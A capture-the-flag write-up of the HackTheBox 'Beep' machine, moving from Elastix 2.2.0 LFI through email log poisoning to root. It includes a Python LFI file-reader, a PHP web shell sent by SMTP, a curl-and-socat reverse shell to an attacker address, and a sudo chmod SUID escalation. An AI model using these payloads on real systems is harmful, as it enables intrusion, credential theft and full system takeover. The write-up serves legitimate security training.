# Beep

## Introduction

Welcome to my another writeup! In this HackTheBox [Beep](https://app.hackthebox.com/machines/Beep) machine, you'll learn: Exploiting RCE via Elastix 2.2.0 LFI & LFI log poisoning via email, privilege escalation via misconfigurated Sudo permission, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: asterisk to root](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Beep/images/Beep.png)

## Service Enumeration

**Create 2 environment variables for future use:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.02|16:47:28(HKT)]
└> export RHOSTS=10.10.10.7
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.02|16:47:31(HKT)]
└> export LHOST=`ifconfig tun0 | grep -E 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]' | cut -d' ' -f10`
```

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.02|16:47:39(HKT)]
└> mkdir scanning; rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN scanning/rustscan.txt
[...]
Open 10.10.10.7:22
Open 10.10.10.7:25
Open 10.10.10.7:80
Open 10.10.10.7:111
Open 10.10.10.7:110
Open 10.10.10.7:143
Open 10.10.10.7:443
Open 10.10.10.7:878
Open 10.10.10.7:993
Open 10.10.10.7:995
Open 10.10.10.7:3306
Open 10.10.10.7:4190
Open 10.10.10.7:4445
Open 10.10.10.7:4559
Open 10.10.10.7:5038
Open 10.10.10.7:10000
[...]
PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
| ssh-dss [...]
|   2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
|_ssh-rsa [...]
25/tcp    open  smtp       syn-ack Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       syn-ack Apache httpd 2.2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       syn-ack Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: RESP-CODES USER UIDL TOP STLS IMPLEMENTATION(Cyrus POP3 server v2) LOGIN-DELAY(0) PIPELINING APOP EXPIRE(NEVER) AUTH-RESP-CODE
111/tcp   open  rpcbind    syn-ack 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       syn-ack Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed SORT=MODSEQ URLAUTHA0001 IMAP4rev1 OK X-NETSCAPE RENAME LIST-SUBSCRIBED CHILDREN ID THREAD=REFERENCES BINARY ATOMIC QUOTA THREAD=ORDEREDSUBJECT CONDSTORE NAMESPACE RIGHTS=kxte STARTTLS CATENATE ANNOTATEMORE LITERAL+ NO IDLE SORT MULTIAPPEND LISTEXT IMAP4 MAILBOX-REFERRALS ACL UIDPLUS UNSELECT
443/tcp   open  ssl/http   syn-ack Apache httpd 2.2.3 ((CentOS))
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2017-04-07T08:22:08
| Not valid after:  2018-04-07T08:22:08
| MD5:   621a:82b6:cf7e:1afa:5284:1c91:60c8:fbc8
| SHA-1: 800a:c6e7:065e:1198:0187:c452:0d9b:18ef:e557:a09f
| -----BEGIN CERTIFICATE-----
[...]
| 2ScJ9I/7b4/cPHDOrAKdzdKxEE2oM0cwKxSnYBJk/4aJIw==
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.2.3 (CentOS)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Elastix - Login page
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: 2023-08-02T08:51:03+00:00; -1s from scanner time.
|_http-favicon: Unknown favicon MD5: 80DCC71362B27C7D0E608B0890C05E9F
878/tcp   open  status     syn-ack 1 (RPC #100024)
993/tcp   open  ssl/imap   syn-ack Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       syn-ack Cyrus pop3d
3306/tcp  open  mysql?     syn-ack
4190/tcp  open  sieve      syn-ack Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp? syn-ack
4559/tcp  open  hylafax    syn-ack HylaFAX 4.3.10
5038/tcp  open  asterisk   syn-ack Asterisk Call Manager 1.1
10000/tcp open  http       syn-ack MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
```

**`nmap` UDP port scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.02|16:47:47(HKT)]
└> sudo nmap -sU $RHOSTS -oN scanning/nmap-udp-top1000.txt 
[...]
Not shown: 994 closed udp ports (port-unreach)
PORT      STATE         SERVICE
69/udp    open|filtered tftp
111/udp   open          rpcbind
123/udp   open          ntp
5000/udp  open|filtered upnp
5060/udp  open|filtered sip
10000/udp open          ndmp
```

According to `rustscan` and `nmap` result, the target machine has 18 port are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|22/TCP            | OpenSSH 4.3                   |
|25/TCP            | Postfix smtpd                 |
|80/TCP            | Apache httpd 2.2.3            |
|110/TCP           | Cyrus pop3d 2.3.7             |
|111/TCP/UDP, 878/TCP| RPC                         |
|123/UDP           | NTP                           |
|143/TCP           | Cyrus imapd 2.3.7             |
|443/TCP           | Apache httpd 2.2.3 ((CentOS)) |
|993/TCP           | Cyrus imapd                   |
|995/TCP           | Cyrus pop3d                   |
|3306/TCP          | MySQL?                        |
|4190/TCP          | Cyrus timsieved 2.3.7         |
|4445/TCP          | Unknown                       |
|4559/TCP          | HylaFAX 4.3.10                |
|5038/TCP          | Asterisk Call Manager 1.1     |
|10000/TCP/UDP     | MiniServ 1.570 (Webmin httpd) |

### SMTP on TCP port 25

**We can try to enumerate system user via command `VRFY`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.02|16:58:01(HKT)]
└> telnet $RHOSTS 25
[...]
VRFY beep
550 5.1.1 <beep>: Recipient address rejected: User unknown in local recipient table
VRFY root
252 2.0.0 root
```

But we'll leave this for now.

### HTTP on TCP port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.02|16:49:56(HKT)]
└> echo "$RHOSTS beep.htb" | sudo tee -a /etc/hosts
10.10.10.7 beep.htb
```

**Index page:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.02|16:50:14(HKT)]
└> httpx http://beep.htb/
HTTP/1.1 302 Found
Date: Wed, 02 Aug 2023 08:50:16 GMT
Server: Apache/2.2.3 (CentOS)
Location: https://beep.htb/
Content-Length: 274
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="https://beep.htb/">here</a>.</p>
<hr>
<address>Apache/2.2.3 (CentOS) Server at beep.htb Port 80</address>
</body></html>
```

When we go to `/`, it'll redirect us to HTTPS schema.

### HTTPS on TCP port 443

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Beep/images/Pasted%20image%2020230802165125.png)

Accept the SSL certificate:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Beep/images/Pasted%20image%2020230802165144.png)

In here, we can see that the web application is using **Elastix**.

> Note: **Elastix** is a [unified communications](https://en.wikipedia.org/wiki/Unified_communications) [server](https://en.wikipedia.org/wiki/Communications_server) software that brings together IP PBX, email, IM, faxing and collaboration functionality. It has a Web interface and includes capabilities such as a [call center](https://en.wikipedia.org/wiki/Call_center) software with predictive dialing. (From [https://en.wikipedia.org/wiki/Elastix](https://en.wikipedia.org/wiki/Elastix))

**We can perform content discovery via `gobuster`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.02|16:56:17(HKT)]
└> gobuster dir -u https://beep.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40 -k
[...]
/modules              (Status: 301) [Size: 307] [--> https://beep.htb/modules/]
/themes               (Status: 301) [Size: 306] [--> https://beep.htb/themes/]
/admin                (Status: 301) [Size: 305] [--> https://beep.htb/admin/]
/images               (Status: 301) [Size: 306] [--> https://beep.htb/images/]
/help                 (Status: 301) [Size: 304] [--> https://beep.htb/help/]
/var                  (Status: 301) [Size: 303] [--> https://beep.htb/var/]
/mail                 (Status: 301) [Size: 304] [--> https://beep.htb/mail/]
/static               (Status: 301) [Size: 306] [--> https://beep.htb/static/]
/lang                 (Status: 301) [Size: 304] [--> https://beep.htb/lang/]
/libs                 (Status: 301) [Size: 304] [--> https://beep.htb/libs/]
/panel                (Status: 301) [Size: 305] [--> https://beep.htb/panel/]
/configs              (Status: 301) [Size: 307] [--> https://beep.htb/configs/]
/recordings           (Status: 301) [Size: 310] [--> https://beep.htb/recordings/]
/vtigercrm            (Status: 301) [Size: 309] [--> https://beep.htb/vtigercrm/]
[...]
```

We found a lot of directories!

**Among them, `/help/` gives us how the application works. In the "Updates" -> "Backup/Restore", we found an old date:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Beep/images/Pasted%20image%2020230802174202.png)

- Found the backup image is dated at **29/09/2010**.

Maybe we can find the Elastix version number and see if there's any public exploits?

**After some researching, I found a site called "[DistroWatch](https://distrowatch.com/table.php?distribution=elastix)":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Beep/images/Pasted%20image%2020230803155723.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Beep/images/Pasted%20image%2020230803155750.png)

**In the "Recent Related News and Releases" section, we can try to guess which version of the target's Elastix:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Beep/images/Pasted%20image%2020230803155831.png)

- 2011-11-05: [Distribution Release: Elastix 2.2](https://distrowatch.com/6972)  
- 2010-08-04: [Distribution Release: Elastix 2.0](https://distrowatch.com/6218)

Since the backup image is dated at **29/09/2010**, there's no way it can be version 2.0, so we can guess it's **version 2.2**.

**After guessing the Elastix version, we can try to use `searchsploit` to search for public exploits:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|16:10:24(HKT)]
└> searchsploit elastix
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities              | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities        | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                     | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                    | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                   | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution               | php/webapps/18650.py
--------------------------------------------------------------------- ---------------------------------
[...]
```

"Elastix < 2.5 - PHP Code Injection" and "FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution" sounds good, let's try to run those exploits.

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|16:11:11(HKT)]
└> searchsploit -m 18650
  Exploit: FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/18650
     Path: /usr/share/exploitdb/exploits/php/webapps/18650.py
    Codes: OSVDB-80544, CVE-2012-4869
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (418)
Copied to: /home/siunam/ctf/htb/Machines/Beep/18650.py

┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|16:11:16(HKT)]
└> searchsploit -m 38091
  Exploit: Elastix < 2.5 - PHP Code Injection
      URL: https://www.exploit-db.com/exploits/38091
     Path: /usr/share/exploitdb/exploits/php/webapps/38091.php
    Codes: OSVDB-127251
 Verified: False
File Type: PHP script, ASCII text, with very long lines (308)
Copied to: /home/siunam/ctf/htb/Machines/Beep/38091.php
```

However, when I tried to run it, none of those exploits work. I even modified and rewrote a little bit of those exploit scripts, but no dice.

### HTTPS on TCP port 10000

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Beep/images/Pasted%20image%2020230803161634.png)

As you can see, it's the Webmin server.

> Note: Webmin is a web-based server management control panel for Unix-like systems. Webmin allows the user to configure operating system internals. (From [https://en.wikipedia.org/wiki/Webmin](https://en.wikipedia.org/wiki/Webmin))

**According to `nmap`'s version scan, the Webmin server is in version 1.570:** 
```shell
10000/tcp open  http       syn-ack MiniServ 1.570 (Webmin httpd)
```

**Armed with above information, we can yet again use `searchsploit` to search for public exploits:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|16:18:28(HKT)]
└> searchsploit webmin 1.570
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)        | linux/webapps/47330.rb
--------------------------------------------------------------------- ---------------------------------
[...]
```

Umm... Looks like Webmin version **before 1.920** is vulnerable to Remote Code Execution (RCE).

However, I don't wanna use any Metasploit modules.

**After Googling around, we found its CVE id:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Beep/images/Pasted%20image%2020230803162246.png)

However, with further inspection, this CVE only affects Webmin version after 1.890???

## Initial Foothold

Let's take a step back...

**In Elastix, we also saw that there's a Local File Inclusion (LFI) exploit:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|16:34:12(HKT)]
└> searchsploit elastix
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
[...]
Elastix 2.2.0 - 'graph.php' Local File Inclusion                     | php/webapps/37637.pl
[...]
--------------------------------------------------------------------- ---------------------------------
[...]
```

**Let's read that exploit script's code:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|16:35:42(HKT)]
└> searchsploit -m 37637
  Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
      URL: https://www.exploit-db.com/exploits/37637
     Path: /usr/share/exploitdb/exploits/php/webapps/37637.pl
    Codes: N/A
 Verified: True
File Type: ASCII text
Copied to: /home/siunam/ctf/htb/Machines/Beep/37637.pl
```

**After reading it, `/vtigercrm/graph.php`'s `current_language` GET parameter is vulnerable to LFI:**
```
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

**But, the exploit is kinda broken:** 
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|16:38:27(HKT)]
└> perl 37637.pl
	 Elastix 2.2.0 LFI Exploit 
	 code author cheki   
	 0day Elastix 2.2.0  
	 email: anonymous17hacker{}gmail.com 

 Target: https://ip https://10.10.10.7

[-] not successful
```

**So, I tested the above payload and it worked:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|16:40:00(HKT)]
└> curl -k 'https://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action'
# This file is part of FreePBX.
#
#    FreePBX is free software: you can redistribute it and/or modify
[...]
```

**Let's rewrite the exploit in Python and try to read configuration files:**
```python
#!/usr/bin/env python3
import requests
import urllib3

if __name__ == '__main__':
    urllib3.disable_warnings()
    #LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
    RHOSTS = str(input('[*] What\'s the target host: (i.e: beep.htb, 10.10.10.7) '))
    PATH = '/vtigercrm/graph.php'
    LFI_PARAMETER = 'current_language'
    PATH_TRAVERSAL = '../../../../../../../../'
    NULL_BYTE = '%00'
    OTHER_PARAMETERS = '&module=Accounts&action'

    print('[*] Target file (Type "exit" or hit Ctrl + C to exit)')
    while True:
        try:
            target_file = str(input('> '))
            if target_file == 'exit':
                print('[*] Bye!')
                break
            if len(target_file) == 0:
                continue

            LFI_response = requests.get(f'https://{RHOSTS}{PATH}?{LFI_PARAMETER}={PATH_TRAVERSAL}{target_file}{NULL_BYTE}{OTHER_PARAMETERS}', verify=False)
            LFI_responseText = LFI_response.text.replace('Sorry! Attempt to access restricted file.', '').strip()
            if not LFI_responseText:
                print('[-] File doesn\'t exist...')
                continue

            print(f'[+] File content:\n{LFI_responseText}')
        except KeyboardInterrupt:
            print('\n[*] Bye!')
            break
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|17:06:40(HKT)]
└> python3 37637_modified.py
[*] What's the target host: (i.e: beep.htb, 10.10.10.7) 10.10.10.7
[*] Target file (Type "exit" or hit Ctrl + C to exit)
> /etc/amportal.conf
[+] File content:
# This file is part of FreePBX.
#
#    FreePBX is free software: you can redistribute it and/or modify
[...]
```

Now, what can we do via exploiting LFI?

**We can try to:**

1. Remote Code Execution (RCE) via LFI log poisoning
2. Read configuration files

Let's try LFI log poisoning.

**After fuzzing around, it seems like there's no Apache log file:**
```shell
> /var/log/apache/access.log
[-] File doesn't exist...
> /var/log/apache2/access.log
[-] File doesn't exist...
> /var/log/apache2/error.log
[-] File doesn't exist...
> /var/log/apache/error.log
[-] File doesn't exist...
> /usr/local/apache/log/error_log
[-] File doesn't exist...
> /usr/local/apache2/log/error_log
[-] File doesn't exist...
```

And I found no interesting files we can read to exploit LFI log poisoning.

**Then, I took a closer look at the original PoC's LFI file `/etc/amportal.conf`, there are some credentials!**
```shell
> /etc/amportal.conf
[+] File content:
[...]
# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS={Redacted}
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS={Redacted}
[...]
# FOPWEBROOT: Path to the Flash Operator Panel webroot (leave off trailing slash)
# FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
# FOPRUN: Set to true if you want FOP started by freepbx_engine (amportal_start), false otherwise
# FOPDISABLE: Set to true to disable FOP in interface and retrieve_conf.  Useful for sqlite3 
# or if you don't want FOP.
#
#FOPRUN=true
FOPWEBROOT=/var/www/html/panel
#FOPPASSWORD=passw0rd
FOPPASSWORD={Redacted}
[...]
# This is the default admin password to allow an administrator to login to ARI bypassing all security.
# Change this to a secure password.
ARI_ADMIN_PASSWORD={Redacted}
[...]
```

**Armed with above information, we can expand our attack surface:**

1. SSH via system user password reuse
2. Reading and sending emails via SMTP, POP3 and IMAP
3. RCE via LFI log poisoning with emails 

Let's stick to the LFI log poisoning!

According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-email), we can **send a mail** to a internal account (`user@localhost`) containing our PHP payload like `<?php echo system($_REQUEST["cmd"]); ?>` and try to include to the mail of the user with a path like `/var/mail/<USERNAME>` or `/var/spool/mail/<USERNAME>`.

To send a email, we need to:

- Find a internal account:

**This can be achieved via LFI:**
```shell
> /etc/passwd
[+] File content:
root:x:0:0:root:/root:/bin/bash
[...]
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
[...]
fanis:x:501:501::/home/fanis:/bin/bash
```

In here, we can see that there's user called `asterisk`, and `fanis`.

After some testing, we can send a email to user `asterisk` and able to read its email.

- Send a email with PHP web shell payload to system user `asterisk`:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|17:42:23(HKT)]
└> telnet $RHOSTS 25
[...]
220 beep.localdomain ESMTP Postfix
MAIL FROM: blah@foobar.anything
250 2.1.0 Ok
RCPT TO: asterisk@beep.localdomain
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET["cmd"]); ?>
.
250 2.0.0 Ok: queued as F0B55D92FD
```

- Verify we can read `asterisk`'s email:

```shell
> /var/mail/asterisk
[+] File content:
From blah@foobar.anything  Thu Aug  3 12:46:07 2023
Return-Path: <blah@foobar.anything>
X-Original-To: asterisk@beep.localdomain
Delivered-To: asterisk@beep.localdomain
Received: from unknown (unknown [10.10.14.8])
	by beep.localdomain (Postfix) with SMTP id F0B55D92FD
	for <asterisk@beep.localdomain>; Thu,  3 Aug 2023 12:45:47 +0300 (EEST)
Message-Id: <20230803094600.F0B55D92FD@beep.localdomain>
Date: Thu,  3 Aug 2023 12:45:47 +0300 (EEST)
From: blah@foobar.anything
To: undisclosed-recipients:;
```

**Nice! Then we should be able to execute system commands via LFI:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|17:53:04(HKT)]
└> curl -k 'https://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action&cmd=id'
[...]
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)

Sorry! Attempt to access restricted file.
```

Nice! Let's get a reverse shell!

- Setup a `socat` TTY listener: (For fully upgraded reverse shell)

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|17:57:36(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/08/03 17:57:43 socat[207835] N opening character device "/dev/pts/3" for reading and writing
2023/08/03 17:57:43 socat[207835] N listening on AF=2 0.0.0.0:443

```

- Host the `socat` binary via Python's `http.server` module:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|17:59:11(HKT)]
└> file /opt/static-binaries/binaries/linux/x86/socat-2.0.0-b8/socat                           
/opt/static-binaries/binaries/linux/x86/socat-2.0.0-b8/socat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, with debug_info, not stripped
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|17:59:27(HKT)]
└> python3 -m http.server -d /opt/static-binaries/binaries/linux/x86/socat-2.0.0-b8/ 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Send the reverse shell payload: (Generated from [revshells.com](https://www.revshells.com/) and URL encoded from [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=Y3VybCBodHRwOi8vMTAuMTAuMTQuOC9zb2NhdCAtbyAvdG1wL3NvY2F0OyBjaG1vZCAreCAvdG1wL3NvY2F0OyAvdG1wL3NvY2F0IFRDUDoxMC4xMC4xNC44OjQ0MyBFWEVDOicvYmluL2Jhc2gnLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5l))

**Payload:**
```sh
curl http://10.10.14.8/socat -o /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP:10.10.14.8:443 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|17:54:35(HKT)]
└> curl -k 'https://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action&cmd=curl%20http%3A%2F%2F10%2E10%2E14%2E8%2Fsocat%20%2Do%20%2Ftmp%2Fsocat%3B%20chmod%20%2Bx%20%2Ftmp%2Fsocat%3B%20%2Ftmp%2Fsocat%20TCP%3A10%2E10%2E14%2E8%3A443%20EXEC%3A%27%2Fbin%2Fbash%27%2Cpty%2Cstderr%2Csetsid%2Csigint%2Csane'
```

- Profit:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Beep)-[2023.08.03|17:57:36(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/08/03 17:57:43 socat[207835] N opening character device "/dev/pts/3" for reading and writing
2023/08/03 17:57:43 socat[207835] N listening on AF=2 0.0.0.0:443
                                                                 2023/08/03 18:00:24 socat[207835] N accepting connection from AF=2 10.10.10.7:50010 on AF=2 10.10.14.8:443
                                                                2023/08/03 18:00:24 socat[207835] N starting data transfer loop with FDs [5,5] and [7,7]
                                             bash-3.2$ 
bash-3.2$ export TERM=xterm-256color
bash-3.2$ stty rows 22 columns 107
bash-3.2$ whoami; hostname; id; ip a
asterisk
beep
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:50:56:b9:40:cf brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.7/24 brd 10.10.10.255 scope global eth0
```

I'm user `asterisk`!

**user.txt:**
```shell
bash-3.2$ cd /home/fanis
bash-3.2$ cat user.txt
{Redacted}
```

## Privilege Escalation

### asterisk to root

After gaining initial foothold on a target machine, we can escalate our privilege to `root`. To do so, we can enumerate the machine.

**Sudo permission:**
```shell
bash-3.2$ sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS MAIL PS1 PS2 QTDIR
    USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```

In here, we can see that user `asterisk` is able to **run bunch of commands as `root` without any password**!

For me, I'll choose `/bin/chmod` to escalate our privilege to `root`. This binary can add a SUID sticky bit to a file. **If we add it in `/bin/bash`, we can spawn a root Bash shell**.

```shell
bash-3.2$ sudo /bin/chmod +s /bin/bash
bash-3.2$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 713K Jan 22  2009 /bin/bash
```

```shell
bash-3.2$ /bin/bash -p
bash-3.2# whoami; id; hostname; ip a
root
uid=100(asterisk) gid=101(asterisk) euid=0(root) egid=0(root) groups=101(asterisk)
beep
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:50:56:b9:40:cf brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.7/24 brd 10.10.10.255 scope global eth0
```

I'm now `root`! :D

## Rooted

**root.txt:**
```shell
bash-3.2# cd /root
bash-3.2# cat root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Beep/images/Pasted%20image%2020230803180354.png)

## Conclusion

What we've learned:

1. Exploiting RCE via Elastix 2.2.0 LFI & LFI log poisoning via email
